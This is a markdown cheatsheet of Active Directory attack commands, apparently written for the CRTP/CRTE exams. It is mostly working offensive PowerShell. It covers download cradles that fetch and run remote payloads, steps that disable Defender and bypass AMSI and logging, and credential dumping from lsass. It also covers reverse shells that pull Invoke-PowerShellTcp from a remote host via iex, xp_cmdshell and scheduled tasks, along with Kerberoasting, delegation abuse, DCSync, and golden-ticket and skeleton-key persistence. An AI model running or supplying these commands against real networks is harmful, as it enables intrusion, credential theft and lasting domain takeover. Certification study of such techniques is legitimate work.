
# Cheatsheet

Originally for the CRTP and CRTE exams

## Powershell Download Cradles

```powershell
iex (New-Object Net.WebClient).DownloadString('https://somehting/payload.ps1')
# Or
$ie = New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://somehting/payload.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# PSv3 onwards: 
iex (iwr 'https://somehting/payload.ps1')
# or
$h=New-Object _comObject Msxml2.XMLHTTP;$h.open('GET','https://somehting/payload.ps1',$false);$h.send();iex $h.responseText
# or
$wr = [System.Net.WebRequest]::Create("https://something/paylaod.ps1"); $r = $wr.GetResponse(); IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

## Bypasses

```powershell
# AMSI bypass text file before local admin
# With local admin:
Set-MpPreference -DisableRealtimeMonitoring $true

# Check applocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Check for DeviceGuard:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microdoft\Windows\DeviceGuard

# PS execution policy
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"

# Bypass Powershell logging with invisi-shell: https://github.com/OmerYa/Invisi-Shell
# Without admin: (Recommended - Only adds registry for current user)
RunWithRegistryNonAdmin.bat
# Type "exit" from the new powershell session to complete the cleanup - removes added registry.
```

## AV Signature bypasses

AMSITrigger (Github) - detect exact part of script - https://github.com/RythmStick/AMSITrigger  
DefenderCheck (Github) - identify code and strings from a binary/file that defender may flag - https://github.com/matterpreter/DefenderCheck  

Provide path and file to scan: `AMSITrigger_x64.exe -i c:\path\to\script.ps1` and `DefenderCheck.exe PowerUp.ps1`  
For full obfuscation of PS scripts: Invoke-Obfuscation (Github) - https://github.com/danielbohannon/Invoke-Obfuscation  

## Payload Delivery

Use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.  
Basic usage:  

```powershell
# Run on remote machine to load remote binary:
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

Use a port forward to bypass Defender checks:  

```powershell
# run hfs.exe on local machine with the desired binary (https://www.rejetto.com/hfs/)
net use x: \\<remote-hostname>\C$\Users\Public /user:<remote-hostname>\<Username> <password>
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
# remove the share:
net use x: /d

winrs -r :<target-hostname> -u:hostname\user -p:password cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<ip with hfs>
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe

# If the binary fails, check for AppLocker or DeviceGuard
```

## Convert SID to Name

```powershell
# AD Module
Get-ADUser -Identity <sid>
Get-ADGroup -Identity <sid>
```

## Services and Their Abuses

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#abusing-service-tickets  

| Service | Abuse |
| --- | --- |
| CIFS | Access filesystem |
| HOST | Create scheduled tasks |
| HOST + RPCSS | Execute WMI in the target system |
| HOST + WSMAN (WINRM) | Can access target machine and get a Powershell (Enter-PSSession) |
| LDAP | Perform DCSync |
| HTTP | Access via `winrs`

## Domain Enum

Using ActiveDirectory Module: https://github.com/samratashok/ADModule/tree/master/ActiveDirectory  
Or Powerview: https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1  
Or BloodHound: https://github.com/BloodHoundAD/BloodHound  

```powershell
Get-Domain # powerview
Get-ADDomain # AD Module

Get-Domain -Domain new.domain.local # powerview
Get-ADDomain -Identity new.dmain.local # AD Module

Get-DomainSID # powerview
(Get-ADDomain).DomainSID # AD module

Get-DomainPolicyData # Powerview
(Get-DomainPolicyData).systemaccess # Powerview
(Get-DomainPolicyData).kerberospolicy # Powerview - abide by this for creating golden tickets
(Get-DomainPolicyData -Domain alt.local).systemaccess # Powerview

Get-DomainController # powerview
Get-ADDomainController # AD Module
Get-DomainController -Domain alt.local # powerview
Get-ADDomainController -DomainName alt.local # AD Module

Get-DomainUser # powerview
Get-DomainUser -Identity <username> # powerview
Get-ADUser -Filter * -Properties * # ad module
Get-ADUser -Identity studentuser1 -Properties * # ad module

Get-DomainUser -Identity studentuser1 -Properties * # powerview
Get-DomainUser -Properties pwdlastset # powerview
# view all of the properties that can be selected
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name # ad module
# method to detect deception users - they won't have any password resets of logon counts
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} # ad module

Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description # powerview
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description # ad module

Get-DomainComputer | select Name # powerview
Get-DomainComputer –OperatingSystem "Windows Server 2019 Standard" # powerview
Get-DomainComputer -Ping # powerview
Get-ADComputer -Filter * | select Name # ad module
Get-ADComputer -Filter 'OperatingSystem -like "*Windows Server 2019 Standard*"' -Properties OperatingSystem | select Name,OperatingSystem # ad module
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} # ad module
Get-ADComputer -Filter * -Properties * # ad module

Get-DomainGroup –Domain techcorp.local # powerview
Get-ADGroup -Filter * | select Name # ad module
Get-ADGroup -Filter * -Properties * # ad module
Get-ADGroup -Identity <groupname> -Properties * # ad module
Get-DomainGroup *admin* # powerview
# enterprise admin group should only be in the parent domain
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name # ad module

Get-DomainGroupMember -Identity "Domain Admins" -Recurse # powerview
Get-ADGroupMember -Identity "Domain Admins" -Recursive # ad module

# Function to enumerate groups recursively using AD Module
# Usage: `Get-ADPrincipalGroupMembershipRecursive 'username1'`
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
{
  $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
  $groups
  if ($groups.count -gt 0)
  {
    foreach ($group in $groups)
    {
      Get-ADPrincipalGroupMembershipRecursive $group
    }
  }
}

Get-DomainGroup –UserName studentuser1 # powerview
Get-ADPrincipalGroupMembership -Identity studentuser1 # ad module

# Get all the local groups on a machine (needs administrator privs on non-dc machines)
Get-NetLocalGroup -ComputerName us-dc # powerview
# Get members of all local groups on a machine (needs administrator privs on non-dc machines) :
Get-NetLocalGroupMember -ComputerName us-dc # powerview
# Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators # powerview

Get-DomainGPO # powerview
Get-DomainGPO -ComputerIdentity student1.us.techcorp.local # powerview

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-DomainGPOLocalGroup

# Get users which are in a local group of a machine using GPO
Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity student1.us.techcorp.local # powerview
Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity us-mgmt.us.techcorp.local # powerview

# Get machines where the given user is member of a specific group
Get-DomainGPOUserLocalGroupMapping -Identity studentuser1 -Verbose # powerview

Get-DomainOU # powerview
Get-ADOrganizationalUnit -Filter * -Properties * # ad module
# Get GPO applied on an OU. Read GPOname from gplink attribute from Get-DomainOU
Get-DomainGPO -Identity '{7162874B-E6F0-45AD-A3BF-0858DA4FA02F}' # powerview

# Get users which are in a local group of a machine in any OU using GPO
(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping # powerview
# Get users which are in a local group of a machine in a particular OU using GPO
(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping # powerview
# Get computers in an OU
(Get-DomainOU -Identity <OU name>).distinguishedname | %{Get-DomainComputer -SearchBase $_}
# There is a bug in PowerView, otherwise the below command would work
Get-DomainGPOComputerLocalGroupMapping -OUIdentity 'OU=Mgmt,DC=us,DC=techcorp,DC=local' # powerview

# Read ACLs: "SecurityIdentifier" has "ActiveDirectoryRights" on "ObjectDN" with "AceType" 
# reference IdentityReferenceName if GUIDs resolve
# Get the ACLs associated with a specified object
Get-DomainObjectAcl -Identity studentuser1 –ResolveGUIDs # powerview
# Get the ACLs associated with the specified LDAP path to be used for search
Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local" -ResolveGUIDs -Verbose # powerview
# We can also enumerate ACLs using the ActiveDirectory module but without resolving GUIDs
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=us,DC=techcorp,DC=local').Access # powerview

# Search for interesting ACEs (use without GUIDs for faster result)
Find-InterestingDomainAcl -ResolveGUIDs # powerview
# Get the ACLs associated with the specified path
Get-PathAcl -Path "\\us-dc\sysvol" # powerview

# Enum ACLs for a group that the current user is a part of
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
```

## Forest Enumeration

Using ADModule or PowerView

```powershell
Get-DomainTrust # powerview
Get-DomainTrust –Domain techcorp.local # powerview
Get-ADTrust # ad module
Get-ADTrust –Identity techcorp.local # ad module

# Get details about the current forest
Get-Forest # powerview
Get-ADForest # ad module
# Get all domains in the current forest
Get-ForestDomain # powerview
(Get-ADForest).Domains # ad module

# Get all global catalogs for the current forest
Get-ForestGlobalCatalog # powerview
Get-ADForest | select -ExpandProperty GlobalCatalogs # ad module
# Map trusts of a forest
Get-ForestTrust # powerview
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name # ad module
```

## User Hunting

```powershell
# Find all machines on the current domain where the current user has local admin access (PowerView):
Find-LocalAdminAccess –Verbose # powerview
# This function queries the DC of the current or provided domain for a list of
# computers (Get-DomainComputer) and then use multi-threaded Test-AdminAccess on each machine
# This is noisy and it is recommended to only run this on specific machines which you want to target

# This can also be done with the help of remote administration tools like WMI and
# PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.
# See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1

# Find computers where a domain admin (or specified user/group) has sessions:
Find-DomainUserLocation -Verbose # powerview
Find-DomainUserLocation -UserGroupIdentity "StudentUsers" # powerview
# This does not work on win server 2019 or newer versions of win 10. Need local admin access to bypass this.
# This function queries the DC of the current or provided domain for members of the
# given group (Domain Admins by default) using Get-DomainGroupMember, gets
# a list of computers (Get-DomainComputer) and list sessions and logged on users
# (Get-NetSession/Get-NetLoggedon) from each machine.
# This does not work on win server 2019 or newer versions of win 10. Need local admin access to bypass this

# Find computers where a domain admin session is available and current
# user has admin access (uses Test-AdminAccess).
Find-DomainUserLocation -CheckAccess
# Find computers (File Servers and Distributed File servers) where a
# domain admin session is available.
Find-DomainUserLocation –Stealth
```

## Local PrivEsc

PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  
BeRoot: https://github.com/AlessandroZ/BeRoot  
Privesc: https://github.com/enjoiz/Privesc  
winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  

```powershell
# Run all checks from :
# PowerUp
Invoke-AllChecks
# BeRoot
beRoot.exe
# Privesc:
Invoke-PrivEsc
# PEASS-ng:
winPEASx64.exe

# Add current user to admins group
# Unquoted service path example:
Invoke-ServiceAbuse -Name '<service name>' -User <domain>\<username>
```

## Remote Access Options

`winrs` can be used if we have local admin on a machine or if we have a HTTP ticket in our session:  
Can be used to  bypass PSRemoting's system-wide transcripts and script block logging.  

```powershell
# If we have local admin access, this command should run on the target host
winrs -r:<target-hostname> "hostname"
# Interactive shell:
winrs -r:<target-hostname> cmd
# Specifying credentials:
winrs -r :<target-hostname> -u:hostname\user -p:password cmd
```

Powershell Remoting:  

```powershell
# Stateful sessions/commands
$sess = New-PSSession -ComputerName Server1
Enter-PSSession -Session $sess
Invoke-Command -Session $sess -FilePath .\PowerUp.ps1
Invoke-Command -Session $sess -ScriptBlock {whoami}
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName domain.local
# can try adding "-Credential username/password" if you have creds for the remote machine
```

## Lateral Movement Options

Mimikatz dump creds:  

```powershell
# Mimikatz dump creds
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds # On target machine
Invoke-Mimikatz -DumpCreds -ComputerName <computer name> # On remote machine that we have local admin for

# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys"

# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys

# Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

# Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa

# Using comsvcs.dll (LOLBin)
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
# May need to disable defender if lsass.dmp is being detected
# Take the dmp file offline and dump with mimikatz:
sekurlsa::minidump c:\AD\Tools\lsass.dmp
privilege::debug
sekurlsa::ekeys
```

Over Pass The Hash:  

```powershell
# Invoke-Mimikatz.ps1
# Mimikatz new shell with user creds (with NTLM)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe"'
# Mimikatz new shell with user creds (with AES256)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aes256key> /run:powershell.exe"'

# SafetyKatz.exe
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

# Rubeus
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

DCSync:  

```powershell
# Needs DA privs

# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
# SafetyKatz.exe
SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
```

Invoke-PowerShellTCP.ps1:  

```powershell
# Web Reverse shell
powershell.exe -c "iex (iwr http://172.16.100.137/Invoke-PowershellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTCP -Reverse -IPAddress 172.16.100.137 -Port 443"
```

SQL reverse shell:  

```powershell
# SQL reverse shell
'exec master..xp_cmdshell "powershell iex (New-Object Net-WebClient).DownloadString(''http://172.16.100.137/Invoke-PowershellTcp.ps1'')"'
powershell.exe iex (iwr http://172.16.100.137/Invoke-PowershellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.137 -Port 443
```

Scheduled task reverse shell:  

```powershell
# Make sure powershell script has added call at the end of the file
# Host powershell script in the web server
# Start a listener with powercat
# Ensure firewalls are turned off
schtasks /create /S full.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "<username>" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://<host-ip>/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S full.domain.local /TN "<username>"
# Check listener
```

Map a remote folder from compromised machine to a letter drive on your local machine, to copy files across:  

```powershell
# map the drive
net use x: \\<remote-hostname>\C$\Users\Public /user:<remote-hostname>\<Username> <password>
# copy files local to remote
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
# remove the share:
net use x: /d
```

## Domain Privesc - Kerberos

Kerberoasting:    

Find kerberoastable users:  

```powershell
# ActiveDirectory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# PowerView
Get-DomainUser –SPN
```

Request TGS tickets using Rubeus (https://github.com/GhostPack/Rubeus):  
(These will trigger MDI alerts if the targeted accounts are set to support AES encryption)  

```powershell
# [!] Do not use rubeus inside invisi-shell

# Use Rubeus to list Kerberoast stats
Rubeus.exe kerberoast /stats
# Use Rubeus to request a TGS
Rubeus.exe kerberoast /user:serviceaccount /simple

# To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17
# stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec

# Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

Request TGS tickets using Invoke-Kerberoast.ps1 (https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1):  

```powershell
Invoke-Kerberoast -Identity serviceaccount
```

Request tickets using .NET classes (need mimikatz to extract the ticket)(identify targets with PowerView, ADModule or Rubeus):  

```powershell
Add-Type –AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/jefflab-sql02.jefflab.local:1433’
```

Set SPN:  

```powershell
# See if any of our current user's groups have any ACLs that allow a genAll or genWrite over a target user, e.g.:
# use powerview and match on our current users' groups
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

# See if the user already has a SPN:
# Using PowerView
Get-DomainUser -Identity <target-user> | select serviceprincipalname
# Using ActiveDirectory module:
Get-ADUser -Identity <target-user> -Properties ServicePrincipalName | select ServicePrincipalName

# Set the target users spn:
# Powerview
# Set a SPN for the user (unique for the domain)
Set-DomainObject -Identity <target-user> -Set @{serviceprincipalname='<domain>/myspnX'}
# Using ActiveDirectory module:
Set-ADUser -Identity <target-user> -ServicePrincipalNames @{Add='<domain>/myspnX'}

# Then kerberoast this user
```

## Domain Privesc - LAPS (Local Administrator Password Solution)

Find users who can read the password in clear text machines in OUs:  

```powershell
# PowerView
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

# To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text:
# Using Active Directory module - See Get-LapsPermissions.ps1
# https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-powershell
# Using LAPS module (can be copied across machines):
Import-Module C:\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName # legacy
Find-LapsADExtendedRights -Identity OUDistinguishedName # new
```

Read the password:

```powershell
# PowerView
Get-DomainObject -Identity <targetmachine$> | select -ExpandProperty ms-mcs-admpwd
# Active Directory module
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
# LAPS module
Get-AdmPwdPassword -ComputerName <targetmachine> # legacy
Get-LapsADPassword -ComputerName <targetmachine> # new
```

## Domain privesc - gMSA

For over-pass-the-hash, the gMSA username is the account username with 'msDS-GroupManagedServiceAccount'  

```powershell
# A gMSA has object class 'msDS-GroupManagedServiceAccount'. This can be used to find the accounts that can read the managed password.
# Using ADModule
Get-ADServiceAccount -Filter *
# Using PowerView
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'

# The attribute 'msDS-GroupMSAMembership' (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob.
# Read it using ADModule:
Get-ADServiceAccount -Identity <target-user> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

# Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash:
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1 (https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1)
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
# The 'CurrentPassword' attribute in the $decodedpwd contains the clear-text password but cannot be typed
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

# Passing the NTLM hash of the gMSA, we get privileges of the gMSA.
sekurlsa::pth /user:<target-user> /domain:<domain> /ntlm:0a02c684cc0fa1744195edd1aec43078
# We can access the services and machines (server farms) that the account has access to
```

## Domain Privesc - Secrets in Registries

```powershell
# start invisi-shell on the target machine, then:
ls cert:\LocalMachine\My

# export certificate and store on disk (password is used for importing - not the users password)
ls cert:\LocalMachine\My\<thumbprint> | Export-PfxCertificate -FilePath c:\Users\Public\<user>.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
# copy to local machine for later use
```

## Domain Privesc - Delegation

**Unconstrained Delegation:**  

```powershell
# Powerview
Get-NetComputer -UnConstrained
# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}

# Compromise where unconstrained delegation is enabled
# After the connection, we can export TGTs using the below command:
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
# The ticket could be reused:
Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
```

Use the spooler service to force a connection from a target machine in the domain:  
Use this against the domains DC to get the DC$ hash to create a new shell with this machine accounts privileges.  

```powershell
# se MS-RPRN.exe (https://github.com/leechristensen/SpoolSample):
.\MS-RPRN.exe \\<target-machine-FQDM> \\<FQDM-of-unconstrained-delegation-machine>
# We can capture the TGT of of the target machine by using Rubeus (https://github.com/GhostPack/Rubeus) on the machine with unconstrained delegation:
.\Rubeus.exe monitor /interval:5

###

# We can also use PetitPotam.exe (https://github.com/topotam/PetitPotam) on the machine with unconstrained delegation:
.\PetitPotam.exe <machine-w-unconstrained-delegation> <target-machine>
# On the machine with unconstrained delegation:
.\Rubeus.exe monitor /interval:5
# PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC.
```

Dump creds:  

```powershell
# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker'machine:
Rubeus.exe ptt /ticket:<ticket.kirbi>
# Or
[IO.File]::WriteAllBytes("C:\DC.kirbi",
[Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
# Or use Invoke-Mimikatz:
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'

# Run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

**Constrained Delegation:**  

```
# Using PowerView
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth
# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Using Kekeo (https://github.com/gentilkiwi/kekeo), we request a TGT for the first hop service account (we can use a password or NTLM hash):
tgt::ask /user:<user-w/constrained-delegation> /domain:<domain> /rc4:<ntlm hash>

# Verification is not performed on the specified SPN. The sname field is unencrypted and can be modified while requesting the TGS for any SPN.
# kekeo
tgs::s4u /tgt:<kirbi-file-from-previous> /user:Administrator /service:CIFS/<hostname>|HTTP/<hostname>
# In addition to the service specified in msDs-AllowedToDelegateTo, we also specify an alternate service which uses the same service account as the one specified in msDs-AllowedToDelegateTo. This needs to be for the same host

# mimikatz
Invoke-Mimikatz '"kerberos::ptt <kirbi-file-from-previous>"'
Invoke-Command -ScriptBlock{whoami} -ComputerName <hostname>

# or
# Using Rubeus:
Rubeus.exe s4u /user:<target-user> /rc4:<ntlm-hash> /impersonateuser:administrator /msdsspn:CIFS/<hostname> /altservice:HTTP /domain:<hostname> /ptt
# rc4 hash above can be changed to use /aes256 if that works better
# rc4 is the same as ntlm
winrs -r:us-mssql cmd.exe
```

**Resource Based Constrained Delegation:**  

```powershell
# Enumerate if we have Write permissions over any object.
# Look at all interesting ACLs without filtering
# Using PowerView (filter by groups the compromised user is a part of):
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}

# Bloodhound
# Select a user, then search for "outbound control rights" by clicking on the user and scrolling down

# If you have write perms over a domain computer
# Using the ActiveDirectory module, configure RBCD on a target-machine for the compromised/foothold machine:
$comps = 'foothold-machine1$'
Set-ADComputer -Identity <target-machine> -PrincipalsAllowedToDelegateToAccount $comps
# Now, let's get the privileges of foothold-machine1$ by extracting its AES keys:
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# Use the AES key of foothold-machine1$ with Rubeus and access the target machine as ANY user we
want:
.\Rubeus.exe s4u /user:foothold-machine1$ /aes256:<foothold-machine-aes256-key> /msdsspn:http/<target-machine> /impersonateuser:administrator /ptt
winrs -r:<target-machine> cmd.exe
```

## Persistence

**msDS-AllowedToDelegateTo:**  

```powershell
### Setup ###
# Using PowerView:
Set-DomainObject -Identity <newuser> -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity <new-user> -Set @{"msds-allowedtodelegateto"="ldap/<DC-FQDN>"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}

Get-DomainUser –TrustedToAuth

# Using AD module:
Set-ADUser -Identity <newuser> -ServicePrincipalNames @{Add='dev/svc'}
Set-ADUser -Identity <newuser> -Add @{'msDS-AllowedToDelegateTo'= @('ldap/<DC-hostname>','<DC-FQDN>')} -Verbose
Set-ADAccountControl -Identity <newuser> -TrustedToAuthForDelegation $true

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

### Abuse ###
# Abuse using Kekeo:
kekeo# tgt::ask /user:<newuser> /domain:us.techcorp.local /password:Password@123!
kekeo# tgs::s4u /tgt:<kirbi-file-from-previous> /user:Administrator@<domain> /service:ldap/<DC-FQDN>

Invoke-Mimikatz -Command '"kerberos::ptt <kirbi-file-from-previous>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'

# Abuse using Rubeus:
Rubeus.exe hash /password:Password@123! /user:<newuser> /domain:<domain>
Rubeus.exe s4u /user:<newuser> /rc4:539259E25A0361EC4A227DD9894719F6 /impersonateuser:administrator /msdsspn:ldap/<CD-FQDN> /domain:<domain> /ptt
SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
```

**Golden Ticket:**  

```powershell
# Note: /sid: is the domain's SID
# Note: can use NTLM hash or AES key
# Execute mimikatz on DC to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
# Or
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
# On a machine which can reach the DC over network:
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:<ntlm> /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Using SafetyKatz
SafetyKatz.exe "lsadump::lsa /patch" "exit"
# or
SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
# On a machine which can reach the DC over network (Need elevation):
BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:S-1-5-21-210670787-2521448726-163245708 /krbtgt:<ntlm> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```

**Silver Ticket:**  

```powershell
# Using hash of the Domain Controller computer account, below command provides access to shares on the DC.
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:S-1-5-21-210670787-2521448726-163245708 /target:<DC-FQDN> /service:cifs /rc4:<ntlm> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
# Can use others tools used above.
```

**Diamond Ticket:**  

```powershell
# We would still need krbtgt AES keys. Use the following Rubeus command to create a diamond ticket (note that RC4 or AES keys of the user can be used too):
Rubeus.exe diamond /krbkey:<hash> /user:<foothold-user> /password:<foothold-password> /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<domain-DC> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# We could also use /tgtdeleg option in place of credentials in case we have access as a domain user:
Rubeus.exe diamond /krbkey:<hash> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:<domain> /dc:<domain-DC> /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

**Skeleton Key:**  

```powershell
# Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <dc-name>
# Now, it is possible to access any machine with a valid username and password as "mimikatz"
Enter-PSSession –Computername <domain-computer> –credential <domain>\Administrator
# You can access other machines as well as long as they authenticate with the DC which has been patched and the DC is not rebooted
```

If lsass is a protected process, can use skeleton key but needs mimikatz driver (mimidriv.sys) on disk of the target DC:  

```powershell
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
# The above is very noisy in the logs due to service creation
```

To set a custom skeleton key password:  
See - https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_misc.c#L611  
For example, to use "S3c3rtP@ss", compute its RC4 and split it into 8 bytes stubs:  
56aa742a  
6bebb9ca  
62fc9f70  
a2e00cd3  
Reverse the values by 2 bytes  
2a74aa56  
cab9eb6b  
709ffc62  
d30ce0a2  
Prepend 0x to each and modify kiwikey array value in the code linked above  
`DWORD kiwiKey[] = {0x2a74aa56, 0xcab9eb6b, 0x709ffc62, 0xd30ce0a2}`  

**DSRM:**  
DA privs on DC  

```powershell
# Dump DSRM password (needs DA privs)
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername us-dc
# Compare the Administrator hash with the Administrator hash of below command
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername us-dc
